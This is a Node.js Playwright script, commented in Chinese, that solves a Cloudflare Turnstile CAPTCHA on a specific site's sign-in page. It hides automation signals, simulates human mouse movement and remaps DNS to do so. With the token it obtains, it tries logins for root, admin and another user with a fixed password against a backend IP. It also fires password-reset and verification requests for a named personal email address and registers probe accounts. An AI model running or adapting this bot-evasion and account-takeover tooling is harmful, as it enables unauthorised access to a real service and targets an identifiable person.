// 17924 — 修正版：①校准用官方交互测试 key 3x00000000000000000000FF（2x 官方恒失败）
// ②真 sitekey 固定跑真实 https://foxrouter.org/sign-in（http origin 的 /fr 会被 NotSameSite 拦）
// ③foxrouter.org / challenges / brunhild / hagen 全部用 --host-resolver-rules MAP 到实测 IPv4（绕开 runner 无 AAAA 解析）
// 判据只认 cf-turnstile-response.value 非空；命中即同 runner 同 IP POST login。
const { chromium } = require('playwright-core');
const fs = require('fs');
const T = process.env.RUNNER_TEMP || '/tmp';
const REAL = '0x4AAAAAAEGBqst_6XV04SLn';
const CALKEY = '3x00000000000000000000FF';
const FR_IPS = ['104.16.148.55', '104.16.157.68', '104.17.246.201', '104.17.121.154', '104.18.45.2'];
const ROUNDS = parseInt(process.env.ROUNDS || '6', 10);
const SECS = parseInt(process.env.SECS || '180', 10);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36';
const log = s => { const l = '[' + new Date().toISOString().slice(11, 19) + '] ' + s; console.log(l); try { fs.appendFileSync(T + '/r.log', l + '\n'); } catch (e) {} };
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rnd = (a, b) => a + Math.random() * (b - a);

async function submit(tok, tag) {
  const base = 'http://63.141.242.130:3000';
  const run = async (name, url, body) => {
    try {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Origin': 'https://foxrouter.org' }, body: body });
      log(`SUBMIT ${tag} ${name} -> ${r.status} ${(await r.text()).slice(0, 600)}`);
    } catch (e) { log(`SUBMIT ${tag} ${name} ERR ${e}`); }
  };
  for (const u of ['root', 'admin', 'aPG666a']) {
    await run('login_' + u, base + '/api/user/login?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: u, password: 'a2317471' }));
  }
  await run('reset_pw', base + '/api/user/reset_password?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null);
  await run('register_probe', base + '/api/user/register?turnstile=' + encodeURIComponent(tok), JSON.stringify({ username: 'p' + Date.now() % 100000, password: 'Probe12345!', email: 'p' + Date.now() % 100000 + '@example.com' }));
  await run('verify_mail', base + '/api/verification?email=robincranston35%40gmail.com&turnstile=' + encodeURIComponent(tok), null);
}

async function humanMove(page, x, y) {
  const vp = page.viewportSize() || { width: 1280, height: 940 };
  let cx = rnd(0.5, 0.9) * vp.width, cy = rnd(0.6, 0.95) * vp.height;
  for (let i = 1; i <= 22; i++) {
    const t = i / 22;
    await page.mouse.move(cx + (x - cx) * t + Math.sin(t * 7) * rnd(-12, 12), cy + (y - cy) * t + Math.cos(t * 9) * rnd(-9, 9));
    await sleep(rnd(9, 26));
  }
  await page.mouse.move(x + 1, y + 1); await sleep(rnd(220, 520));
  await page.mouse.down(); await sleep(rnd(70, 150)); await page.mouse.up();
}

// 取挑战 iframe（在 shadow root 内）的 boundingBox，再点容器内交互元素坐标
async function clickWidget(page, tag, pick) {
  const frames = page.frames().filter(f => f !== page.mainFrame() && /challenges\.cloudflare\.com/.test(f.url()));
  const cands = [];
  for (const f of frames) { try { const el = await f.frameElement(); const b = el ? await el.boundingBox() : null; if (b) cands.push({ b, f }); } catch (e) {} }
  // pick='tl' -> 取左上角（校准 widget 是 position:fixed 20,20）；否则取第一个
  if (pick === 'tl') cands.sort((a, c) => (a.b.x + a.b.y) - (c.b.x + c.b.y));
  let box = cands.length ? cands[0].b : null, frame = cands.length ? cands[0].f : null;
  if (!box) { log('CLICK_NOBOX ' + tag); return false; }
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
  await sleep(rnd(150, 350));
  await humanMove(page, box.x + 26, box.y + box.height / 2);
  let inner = ''; try { inner = (await frame.evaluate(() => document.body.innerText)).replace(/\s+/g, ' '); } catch (e) { inner = '<x>'; }
  log(`CLICKED ${tag} box=${Math.round(box.x)},${Math.round(box.y)},${Math.round(box.width)}x${Math.round(box.height)} frameBody=${inner.slice(0, 60)}`);
  return true;
}

const readTok = (page, sel) => page.evaluate(s => {
  try {
    if (s) { const w = document.querySelector(s); const i = w && w.querySelector('input[name="cf-turnstile-response"]'); return (i && i.value) || (w && w.__tok) || ''; }
    const s2 = []; (function w(r) { for (const e of r.querySelectorAll('*')) { if (e.shadowRoot) w(e.shadowRoot); if (e.name === 'cf-turnstile-response' && e.value) s2.push(e.value); } })(document);
    return s2[0] || '';
  } catch (e) { return ''; }
}, sel).catch(() => '');

function hook(page, tag) {
  const t0 = Date.now(); const E = () => ((Date.now() - t0) / 1000).toFixed(1);
  page.on('console', m => { const t = m.text(); if (/ERRCB|BEFORE|AFTER|TIMEOUT|error|Error|600010|110200/.test(t)) log(`[${E()}s C] ${m.type()} ${t.slice(0, 130)}`); });
  page.on('pageerror', e => log(`[${E()}s PE] ${String(e).slice(0, 130)}`));
  page.on('response', async r => {
    const u = r.url();
    if (!/challenge-platform|challenges\.cloudflare/.test(u)) return;
    if (/\.(png|woff2?)/.test(u) || u.startsWith('blob:')) return;
    let b = '', n = 0; try { b = await r.text(); n = b.length; } catch (e) { b = '<nb>'; }
    log(`[${E()}s R${r.status()} len=${n}] ${r.request().method()} ${u.slice(0, 100)} :: ${String(b).replace(/\s+/g, ' ').slice(0, 80)}`);
  });
  page.on('requestfailed', r => { if (/challenge/.test(r.url())) log(`[${E()}s FAILED ${r.url().slice(0, 100)} ${(r.failure() || {}).errorText}`); });
  return E;
}

(async () => {
  const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(e => 'ERR');
  log('RUNNER_EGRESS ' + ip);
  const dir = T + '/prof';
  const ctx = await chromium.launchPersistentContext(dir, {
    executablePath: '/usr/bin/google-chrome', headless: false, userAgent: UA,
    viewport: { width: 1280, height: 940 }, locale: 'en-US', timezoneId: 'America/New_York',
    ignoreHTTPSErrors: true,
    args: ['--no-sandbox', '--disable-dev-shm-usage', '--no-proxy-server', '--ignore-certificate-errors',
      '--disable-blink-features=AutomationControlled', '--exclude-switches=enable-automation',
      '--disable-features=ThirdPartyStoragePartitioning,TrackingProtection3pcd,PrivacySandboxSettings4',
      '--host-resolver-rules=' + [
        'MAP foxrouter.org ' + (process.env.FR || FR_IPS[0]),
        'MAP challenges.cloudflare.com 104.18.94.41',
        'MAP brunhild.challenges.cloudflare.com 104.18.8.208',
        'MAP hagen.challenges.cloudflare.com 104.18.9.208',
        'MAP api.foxrouter.org 63.141.242.130'].join(', ')]});
  await ctx.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    window.chrome = window.chrome || { runtime: {} };
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
  });

  // ── 步骤 A：校准。在真实 https origin 上额外注入一个 3x 测试 key 的 widget，必须先出 DUMMY token。
  let calOk = '';
  {
    const page = await ctx.newPage();
    const E = hook(page, 'cal');
    log('ROUND cal 3x https://foxrouter.org/sign-in');
    try { await page.goto('https://foxrouter.org/sign-in?c=' + Date.now(), { waitUntil: 'domcontentloaded', timeout: 40000 }); } catch (e) { log('GOTO_ERR ' + String(e).slice(0, 120)); }
    for (let i = 0; i < 20; i++) { const ok = await page.evaluate(() => !!window.turnstile).catch(() => false); if (ok) break; await sleep(1000); }
    const injected = await page.evaluate(k => {
      try {
        const d = document.createElement('div'); d.id = 'calw'; d.style.cssText = 'position:fixed;left:20px;top:20px;z-index:99999;background:#fff;padding:6px';
        document.body.appendChild(d); d.__ev = [];
        window.turnstile.render('#calw', { sitekey: k, appearance: 'always', size: 'normal',
          callback: t => { d.__tok = t; d.__ev.push('TOK'); console.log('CALTOK ' + t); },
          'error-callback': e => { d.__ev.push('ERR' + e); console.log('CALERR ' + e); },
          'before-interactive-callback': () => { d.__ev.push('BEFORE'); console.log('CALBEFORE'); },
          'after-interactive-callback': () => { d.__ev.push('AFTER'); console.log('CALAFTER'); } });
        return 'ok';
      } catch (e) { return 'THROW ' + e.message; }
    }, CALKEY);
    log('CAL_INJECT ' + injected);
    const t0 = Date.now();
    while (Date.now() - t0 < 90000 && !calOk) {
      await sleep(2500);
      calOk = await readTok(page, '#calw');
      const ev = await page.evaluate(() => ((document.getElementById('calw') || {}).__ev || []).join('|')).catch(() => '');
      log(`[${E()}s] calTok=${calOk.length} ev=${ev.slice(-40)}`);
      if (!calOk && (Date.now() - t0) > 6000 && (Date.now() - t0) < 7000) await clickWidget(page, 'cal', 'tl').catch(() => false);
    }
    try { fs.writeFileSync(T + '/shot_cal.png', await page.screenshot()); } catch (e) {}
    await page.close();
    log(calOk ? ('CALIBRATION_OK ' + calOk) : 'CALIBRATION_FAIL');
    if (calOk) { fs.writeFileSync(T + '/token_cal.txt', calOk); await submit(calOk, 'cal'); }
  }

  // ── 步骤 B：真 sitekey，真实 https 页，每轮新 page（新 ray）、人类化分步点击。
  let got = '';
  for (let i = 1; i <= ROUNDS && !got; i++) {
    const page = await ctx.newPage();
    const E = hook(page, 'real');
    const t0 = Date.now();
    log(`ROUND real#${i} sk=${REAL} (ip ${FR_IPS[i % FR_IPS.length]})`);
    try { await page.goto('https://foxrouter.org/sign-in?r=' + Date.now(), { waitUntil: 'domcontentloaded', timeout: 40000 }); } catch (e) { log('GOTO_ERR ' + String(e).slice(0, 120)); }
    await sleep(rnd(2000, 3200));
    let clicks = 0, lastClick = 0, diaged = false;
    while (Date.now() - t0 < SECS * 1000 && !got) {
      await sleep(2500);
      got = await readTok(page, '');
      if (got) break;
      const el = (Date.now() - t0) / 1000;
      const frs = page.frames().filter(f => f !== page.mainFrame() && /challenges\.cloudflare\.com/.test(f.url()));
      log(`[${E()}s] tok=0 nf=${frs.length}`);
      if (frs.length && !diaged) {
        diaged = true;
        const d = await frs[0].evaluate(() => ({ sec: self.isSecureContext, cs: typeof (self.crypto && self.crypto.subtle && self.crypto.subtle.digest), txt: (document.body ? document.body.innerText : '').replace(/\s+/g, ' ').slice(0, 80) })).catch(e => ({ err: String(e).slice(0, 80) }));
        log(`[${E()}s] DIAG ` + JSON.stringify(d));
      }
      if (clicks < 8 && el > 4 && (clicks === 0 || el - lastClick > 16)) {
        const ok = await clickWidget(page, 'real#' + i, '').catch(() => false);
        if (ok) { clicks++; lastClick = el; }
      }
    }
    try { fs.writeFileSync(`${T}/shot_real_${i}.png`, await page.screenshot()); } catch (e) {}
    log(`ROUND_END real#${i} tok_len=${got.length} clicks=${clicks}`);
    await page.close();
    if (got) { fs.writeFileSync(T + '/token.txt', got); log('TOKEN_LINE::' + got); await submit(got, 'real#' + i); }
  }
  log('DONE got=' + got.length);
  await ctx.close(); process.exit(0);
})().catch(e => { log('FATAL ' + e); process.exit(1); });
